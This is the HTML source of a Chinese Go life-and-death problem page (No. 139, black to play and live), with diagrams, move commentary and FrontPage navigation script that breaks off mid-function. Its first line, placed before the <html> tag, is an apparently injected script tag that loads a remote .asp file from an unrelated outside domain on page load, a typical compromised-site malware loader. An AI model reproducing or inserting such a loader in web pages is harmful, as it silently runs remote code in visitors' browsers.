<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第139型 黑先活</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第139型      黑先活</span></font><!--mstheme--></font></h1>         <div align="center">           <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">           <tr>             <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No139_1.png" width="232" height="232"><!--mstheme--></font></td>          <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>          <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No139_2.png" width="232" height="232"><!--mstheme--></font></td>       </tr>       <tr>         <td width="45%" valign="top"><!--mstheme--><font face="宋体">           <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>           <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1护住气紧的一边，总归没错。不过，此形还有赖于角的特殊性。白2断时，黑3的立容易成为盲点！白4长，则黑5做眼，关键在于a位的不入气。黑3如于4位打，白可于3位打。</span></font><!--mstheme--></font></td>        <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>        <td width="45%" valign="top"><!--mstheme--><font face="宋体">          <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>          <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1如于另一边虎，不得要领。白2断，此时黑3只好打，被白4先手打，再于6位扳，黑简单不行。关键在于：黑3不能于4位立。</span></font><p>　<!--mstheme--></font></td>      </tr>      <tr>        <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No139_3.png" width="232" height="232"><!--mstheme--></font></td>       <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体">         <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>       <!--mstheme--></font></td>     </tr>     <tr>       <td width="45%" valign="top"><!--mstheme--><font face="宋体">         <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>         <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1如果先立，白2扳，黑不行。黑3虎，白4靠、6接，是破眼的常用手筋（站长：白2于4位点也可）。黑1如于2位立，白可于3位点。</span></font></p>       <!--mstheme--></font></td>       <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     </tr>   </table><!--mstheme--><font face="宋体"></center>   </div>   <p align="center"> <!--webbot bot="Navigation" S-Type="arrows"   S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE"   B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/shuxing/No9/No9.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a
